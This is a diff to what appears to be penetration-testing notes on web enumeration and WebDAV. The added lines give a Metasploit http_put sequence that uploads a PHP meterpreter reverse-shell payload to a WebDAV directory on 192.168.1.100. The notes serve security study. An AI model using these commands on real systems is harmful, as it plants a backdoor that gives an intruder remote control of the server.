@@ -258,3 +258,12 @@ Web enumeration means to look out info about services running on port, versions,
 	dav:/webdav/> put network.png
 
 	dav:/webdav/> mkdir new-dir
+	
+	# msfconsole
+		msf> use auxiliary/scanner/http/http_put
+		msf>auxiliary (http_put) > set rhosts 192.168.1.100
+		msf>auxiliary (http_put) > set payload php/meterpreter/reverse_tcp
+		msf>auxiliary (http_put) > set path /dav/
+		msf>auxiliary (http_put) > set filename meter.php
+		msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
+		msf>auxiliary (http_put) > exploit
